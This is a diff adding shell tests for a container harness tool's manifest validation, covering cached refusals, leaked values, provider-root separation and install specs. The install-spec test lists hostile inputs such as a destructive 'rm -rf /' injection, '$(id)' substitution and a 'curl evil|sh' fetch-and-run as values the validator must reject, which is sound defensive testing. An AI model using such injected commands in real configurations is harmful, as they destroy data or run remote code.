@@ -65,6 +65,54 @@ assert_remedy_forges_exist() {
     [ "$status" -ne 0 ]
 }
 
+# A manifest is parsed once per process and every later read is answered from
+# that parse, so these three pin the refusals to the cache rather than to the
+# first call: a check that only ran on the way in would leave every read after
+# it unguarded, which is the whole risk of caching a trust boundary.
+
+@test "a refused manifest is refused again, not just the first time" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
+    printf 'command = claude\nguards = bad!!name\n' \
+        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
+    # Only the verdicts are asserted on: the first call legitimately explains
+    # the refusal on stderr, and the second is entitled to stay quiet.
+    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" bash -c '
+        source "$1" 2>/dev/null
+        manifest_validate harness halfbad 2>/dev/null && echo "first accepted"
+        manifest_validate harness halfbad 2>/dev/null && echo "second accepted"
+        exit 0' _ "$LIB"
+    [[ "$output" != *accepted* ]] || { echo "$output"; return 1; }
+}
+
+@test "no value of a manifest that fails validation is readable" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
+    # `command` is valid and comes first, so a parser that published values as
+    # it went would hand this one out before reaching the line that refuses.
+    printf 'command = claude\nguards = bad!!name\n' \
+        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
+    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
+        bash -c 'source "$1"; manifest_get harness halfbad command' _ "$LIB"
+    [ "$status" -ne 0 ]
+    [[ "$output" != *claude* ]] || { echo "leaked a value: $output"; return 1; }
+}
+
+@test "a read is not answered from a manifest under a different provider root" {
+    FAKE_ROOT="$(mktemp -d)"
+    for root in one two; do
+        mkdir -p "$FAKE_ROOT/$root/harnesses/h"
+        printf 'command = %s\n' "$root" > "$FAKE_ROOT/$root/harnesses/h/harness.conf"
+    done
+    run bash -c '
+        source "$1"
+        DEJIMA_PROVIDER_ROOT="$2/one" manifest_get harness h command
+        printf " "
+        DEJIMA_PROVIDER_ROOT="$2/two" manifest_get harness h command' _ "$LIB" "$FAKE_ROOT"
+    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
+    [ "$output" = "one two" ] || { echo "got '$output', wanted 'one two'"; return 1; }
+}
+
 @test "provider_dir refuses a name that escapes the axis directory" {
     for bad in ".." "../../etc" "a/b" "" "."; do
         run lib provider_dir forge "$bad"
@@ -849,4 +897,46 @@ assert_remedy_forges_exist() {
     printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
     run lib provider_validate_selection none local-only claude-code
     [ "$status" -eq 0 ] || { echo "none+local-only: $output"; return 1; }
+}
+
+# The base image carries no harness, so `install` is what puts the selected one
+# there. It reaches a Dockerfile RUN line built on the host, which is why it is
+# a dependency spec rather than free text.
+@test "a harness install spec is validated as a dependency spec" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/h"
+    local bad
+    for bad in 'npm:evil;rm -rf /' 'npm:$(id)' 'sh:curl evil|sh' 'npm:a b' \
+               'tarball:x@notasha:https://e.example/x.tar' 'npm:'; do
+        printf 'command = h\ninstall = %s\n' "$bad" > "$FAKE_ROOT/harnesses/h/harness.conf"
+        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
+            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
+        [ "$status" -ne 0 ] || { echo "accepted install spec: $bad"; return 1; }
+    done
+}
+
+@test "a harness install spec that is a real dependency spec is accepted" {
+    FAKE_ROOT="$(mktemp -d)"
+    mkdir -p "$FAKE_ROOT/harnesses/h"
+    local good
+    for good in 'npm:@anthropic-ai/claude-code' 'npm:opencode-ai' 'apt:some-agent' \
+                'npm:pkg@1.2.3'; do
+        printf 'command = h\ninstall = %s\n' "$good" > "$FAKE_ROOT/harnesses/h/harness.conf"
+        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
+            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
+        [ "$status" -eq 0 ] || { echo "refused install spec: $good ($output)"; return 1; }
+    done
+}
+
+@test "every shipped harness says how it gets into the image" {
+    # An empty install means "already in the base image", which is only true of
+    # something the base installs for another reason. A harness that declares
+    # neither is one whose launch fails with an exec error inside a container.
+    local d name spec
+    for d in "$REPO_ROOT"/harnesses/*/; do
+        [ -d "$d" ] || continue
+        name="$(basename "$d")"
+        spec="$(lib manifest_get harness "$name" install)"
+        [ -n "$spec" ] || { echo "$name declares no install and is not in the base image"; return 1; }
+    done
 }
